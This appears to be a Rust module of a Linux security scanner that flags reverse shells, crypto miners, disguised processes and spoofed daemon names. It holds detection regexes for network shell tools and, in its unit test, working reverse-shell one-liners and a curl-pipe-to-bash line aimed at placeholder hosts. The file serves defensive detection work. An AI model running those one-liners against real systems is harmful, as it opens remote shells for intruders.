use crate::config::ScanConfig;
use crate::netdiag;
use crate::pkg::{self, Ownership};
use crate::procfs::{self, ProcInfo};
use crate::report::{progress as prog, send, Finding, ScanEvent, Sender, Severity};
use crate::util::{self, Root};
use regex::RegexSet;
use std::collections::{HashMap, HashSet};
use std::sync::OnceLock;
use std::time::Instant;

const MODULE: &str = "PROCESS";

fn progress(tx: &Sender, msg: &str) {
    prog(tx, MODULE, msg)
}

const SHELLS: [&str; 8] = ["bash", "sh", "zsh", "dash", "fish", "ksh", "csh", "ash"];

/// Real regexes now — the old code passed these to str::contains(), so half of them
/// ("python -c.*import.*socket" ...) could never match anything.
pub const REVSHELL_PATTERNS: [&str; 14] = [
    r"/dev/(tcp|udp)/",
    r"\bbash\s+-i\b.*[>&]",
    r"\b(nc|ncat|netcat)\b.*\s-(e|c)\s",
    r"\bmkfifo\b.*\b(nc|ncat|sh|bash)\b",
    r"\bsocat\b.*\bexec:",
    r"\bopenssl\s+s_client\b.*-connect",
    r"\bpython[0-9.]*\s+-c\s.*import.*socket",
    r"\bpython[0-9.]*\s+-c\s.*pty\.spawn",
    r"\bperl\s+-e\s.*socket",
    r"\bruby\s+-rsocket\b",
    r"\bphp\s+-r\s.*fsockopen",
    r"\blua[0-9.]*\s+-e\s.*socket",
    r"\b(sh|bash)\s+-c\s.*\b(curl|wget)\b[^|]*\|\s*(ba)?sh\b",
    r"\bawk\b.*/inet/tcp/",
];

pub fn revshell_set() -> &'static RegexSet {
    static S: OnceLock<RegexSet> = OnceLock::new();
    S.get_or_init(|| RegexSet::new(REVSHELL_PATTERNS.iter().map(|p| format!("(?i){}", p))).expect("valid regex"))
}

fn reverse_shell_detection(tx: &Sender, procs: &[ProcInfo]) {
    progress(tx, "Checking for reverse shells (socket stdio + command patterns)...");
    let by_pid: HashMap<u32, &ProcInfo> = procs.iter().map(|p| (p.pid, p)).collect();
    // inodes of listening sockets (network servers)
    let conns = netdiag::netlink_all().unwrap_or_else(netdiag::proc_net_all);
    let listen_inodes: HashSet<u64> = conns.iter().filter(|c| c.is_listener()).map(|c| c.inode).collect();

    for p in procs {
        let name = p.name.to_lowercase();
        let is_shell = SHELLS.contains(&name.as_str());

        if is_shell {
            // Behaviour: a shell whose stdin/stdout is a network socket is a reverse/bind shell.
            let fds = procfs::fds(p.pid);
            let stdio_socket = fds.iter().filter(|(fd, t)| *fd <= 2 && t.starts_with("socket:[")).count();
            let stdio_tty = fds.iter().any(|(fd, t)| *fd <= 2 && (t.starts_with("/dev/pts/") || t.starts_with("/dev/tty")));
            if stdio_socket >= 2 && !stdio_tty {
                send(
                    tx,
                    Finding::new(
                        Severity::Danger,
                        MODULE,
                        "Reverse Shell",
                        &format!("Shell '{}' (PID {}) has its stdin/stdout wired to a network socket", p.name, p.pid),
                    )
                    .with_detail(&format!("Cmdline: {}\nParent PID: {}", p.cmdline, p.ppid))
                    .subject(&format!("pid:{}", p.pid)),
                );
                continue;
            }
            // Shell spawned by a network server (owns a LISTEN socket) without a terminal
            if let Some(parent) = by_pid.get(&p.ppid) {
                let parent_listens = procfs::pid_socket_inodes(parent.pid).iter().any(|i| listen_inodes.contains(i));
                // web servers, or service accounts (www-data, tomcat...: 0 < uid < 1000) that listen.
                // Root daemons (sshd for `ssh host cmd`) and users' own dev servers are excluded.
                let service_account = parent.uid > 0 && parent.uid < 1000;
                if parent_listens && !stdio_tty && (is_web_server(&parent.name) || service_account) {
                    send(
                        tx,
                        Finding::new(
                            Severity::Danger,
                            MODULE,
                            "Reverse Shell",
                            &format!("Shell '{}' (PID {}) spawned by network server '{}' (PID {}) without a terminal", p.name, p.pid, parent.name, parent.pid),
                        )
                        .with_detail(&format!("Cmdline: {}\nParent: {}\nTypical of web-shell / RCE exploitation", p.cmdline, parent.cmdline))
                        .subject(&format!("pid:{}", p.pid)),
                    );
                    continue;
                }
            }
        }

        let matches: Vec<usize> = revshell_set().matches(&p.cmdline).into_iter().collect();
        if let Some(&i) = matches.first() {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Reverse Shell", &format!("PID {} — reverse-shell command pattern", p.pid))
                    .with_detail(&format!("Name: {}\nCmdline: {}\nPattern: {}", p.name, p.cmdline, REVSHELL_PATTERNS[i]))
                    .subject(&format!("pid:{}", p.pid)),
            );
        }
    }
}

fn is_web_server(name: &str) -> bool {
    let n = name.to_lowercase();
    ["apache", "httpd", "nginx", "lighttpd", "caddy", "php-fpm", "tomcat", "uwsgi", "gunicorn"].iter().any(|w| n.contains(w))
}

fn crypto_miner_detection(tx: &Sender, procs: &[ProcInfo]) {
    progress(tx, "Checking for crypto miners...");
    let miner_names = ["xmrig", "minerd", "minergate", "cpuminer", "ethminer", "cgminer", "bfgminer", "ccminer", "nheqminer", "t-rex", "nbminer", "lolminer"];
    let miner_args =
        ["stratum+tcp://", "stratum+ssl://", "stratum2+tcp://", "--donate-level", "--randomx", "-a rx/0", "--algo=rx", "cryptonight", "kawpow", "nicehash"];
    for p in procs {
        let name = p.name.to_lowercase();
        let cmd = p.cmdline.to_lowercase();
        let hit = miner_names
            .iter()
            .find(|m| name.contains(*m))
            .map(|m| format!("miner binary name '{}'", m))
            .or_else(|| miner_args.iter().find(|a| cmd.contains(*a)).map(|a| format!("mining argument '{}'", a)));
        if let Some(why) = hit {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Crypto Miner", &format!("PID {} ({}) — {}", p.pid, p.name, why))
                    .with_detail(&format!("Cmdline: {}\nExe: {}", p.cmdline, p.exe))
                    .subject(&format!("pid:{}", p.pid))
                    .artifact(&format!("/proc/{}/exe", p.pid)),
            );
        }
    }
}

fn suspicious_process_patterns(tx: &Sender, procs: &[ProcInfo]) {
    progress(tx, "Checking for disguised and suspicious processes...");
    let root = Root::live();
    let obfuscation =
        RegexSet::new([r"(?i)base64\s+(-d|--decode)", r"(?i)\becho\s+[A-Za-z0-9+/=]{40,}\s*\|", r"(?i)\bxxd\s+-r\b.*\|\s*(ba)?sh", r"(?i)\beval\s*\$\("])
            .expect("regex");

    // Known daemon names and every path they legitimately live at (merged-/usr aware)
    let mimics: [(&str, &[&str]); 7] = [
        ("sshd", &["/usr/sbin/sshd", "/usr/lib/openssh/sshd-session", "/usr/libexec/openssh/sshd-session"]),
        ("cron", &["/usr/sbin/cron"]),
        ("crond", &["/usr/sbin/crond"]),
        ("systemd", &["/usr/lib/systemd/systemd", "/lib/systemd/systemd", "/usr/bin/systemd"]),
        ("dbus-daemon", &["/usr/bin/dbus-daemon"]),
        ("rsyslogd", &["/usr/sbin/rsyslogd"]),
        ("systemd-journald", &["/usr/lib/systemd/systemd-journald", "/lib/systemd/systemd-journald"]),
    ];

    for p in procs {
        if p.exe.is_empty() {
            continue;
        }
        if util::is_temp_path(&p.exe) || p.exe.starts_with("/run/") || p.exe.starts_with("/dev/") {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Temp Exec", &format!("PID {} runs from a temp/runtime location: {}", p.pid, p.exe))
                    .with_detail(&format!("Name: {}\nCmdline: {}", p.name, p.cmdline))
                    .subject(&format!("pid:{}", p.pid))
                    .artifact(&format!("/proc/{}/exe", p.pid)),
            );
        }
        if obfuscation.is_match(&p.cmdline) {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Obfuscation", &format!("PID {} — encoded/obfuscated command line", p.pid))
                    .with_detail(&format!("Cmdline: {}", util::truncate(&p.cmdline, 300)))
                    .subject(&format!("pid:{}", p.pid)),
            );
        }
        if p.name.starts_with('.') || p.name.trim().is_empty() || p.name.starts_with(' ') {
            send(
                tx,
                Finding::new(Severity::Warning, MODULE, "Hidden Name", &format!("PID {} has a hidden/blank process name '{}'", p.pid, p.name))
                    .with_detail(&format!("Exe: {}\nCmdline: {}", p.exe, p.cmdline))
                    .subject(&format!("pid:{}", p.pid)),
            );
        }
        // user-space process pretending to be a kernel thread: "[kworker/0:1]" with an exe
        let argv0 = procfs::read_cmdline_argv0(p.pid);
        if argv0.starts_with('[') && argv0.ends_with(']') {
            send(
                tx,
                Finding::new(Severity::Danger, MODULE, "Kthread Disguise", &format!("PID {} poses as kernel thread {} but runs {}", p.pid, argv0, p.exe))
                    .with_detail("Real kernel threads have no executable — classic malware disguise")
                    .subject(&format!("pid:{}", p.pid))
                    .artifact(&format!("/proc/{}/exe", p.pid)),
            );
        }
        for (name, paths) in &mimics {
            if p.name == *name && !p.exe_deleted {
                let canon = std::fs::canonicalize(&p.exe).map(|c| c.to_string_lossy().into_owned()).unwrap_or(p.exe.clone());
                let path_ok = paths.iter().any(|x| *x == p.exe || *x == canon);
                if !path_ok && pkg::owner(&root, &canon) != Ownership::Owned {
                    send(
                        tx,
                        Finding::new(Severity::Warning, MODULE, "Name Spoof", &format!("PID {} calls itself '{}' but runs {}", p.pid, p.name, p.exe))
                            .with_detail(&format!("Expected one of: {}", paths.join(", ")))
                            .subject(&format!("pid:{}", p.pid))
                            .artifact(&format!("/proc/{}/exe", p.pid)),
                    );
                }
            }
        }
    }
}

fn namespace_summary(tx: &Sender, procs: &[ProcInfo]) {
    progress(tx, "Mapping processes to containers/namespaces...");
    let init_ns = procfs::ns_inode(1, "pid").unwrap_or_default();
    if init_ns.is_empty() {
        return;
    }
    let mut containers: HashMap<String, usize> = HashMap::new();
    let mut other_ns = 0;
    for p in procs {
        if procfs::ns_inode(p.pid, "pid").map(|n| n != init_ns).unwrap_or(false) {
            other_ns += 1;
            *containers.entry(procfs::container_of(p.pid).unwrap_or_else(|| "sandbox/unknown".into())).or_default() += 1;
        }
    }
    if other_ns > 0 {
        let list: Vec<String> = containers.iter().map(|(k, v)| format!("{} ({} procs)", k, v)).collect();
        send(
            tx,
            Finding::new(Severity::Info, MODULE, "Namespaces", &format!("{} process(es) in non-host PID namespaces", other_ns))
                .with_detail(&list.join("\n"))
                .subject("namespaces"),
        );
    }
}

pub fn scan(_cfg: &ScanConfig, tx: Sender) {
    let start = Instant::now();
    let _ = tx.send(ScanEvent::ModuleStart(MODULE.to_string()));
    let procs = procfs::read_procs();
    progress(&tx, &format!("Enumerated {} processes (raw getdents64)", procs.len()));
    reverse_shell_detection(&tx, &procs);
    crypto_miner_detection(&tx, &procs);
    suspicious_process_patterns(&tx, &procs);
    namespace_summary(&tx, &procs);
    send(&tx, Finding::new(Severity::Info, MODULE, "Summary", &format!("{} processes analyzed", procs.len())).subject("summary"));
    let _ = tx.send(ScanEvent::ModuleDone(MODULE.to_string(), start.elapsed()));
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn revshell_patterns_match_real_payloads() {
        let s = revshell_set();
        for bad in [
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            "nc -e /bin/sh 10.0.0.1 4444",
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
            "socat tcp:10.0.0.1:4444 exec:/bin/sh,pty",
            "python3 -c 'import socket,subprocess,os;s=socket.socket()'",
            "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
            "perl -e 'use Socket;$i=\"10.0.0.1\"'",
            "php -r '$sock=fsockopen(\"10.0.0.1\",4444);'",
            "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444)'",
            "openssl s_client -quiet -connect 10.0.0.1:4444",
            "sh -c curl -s http://x.y/a.sh | bash",
        ] {
            assert!(s.is_match(bad), "should match: {}", bad);
        }
        for good in ["bash", "/usr/bin/python3 /opt/app/server.py", "nc -zv localhost 22", "openssl version", "curl https://example.com -o file"] {
            assert!(!s.is_match(good), "should not match: {}", good);
        }
    }
}
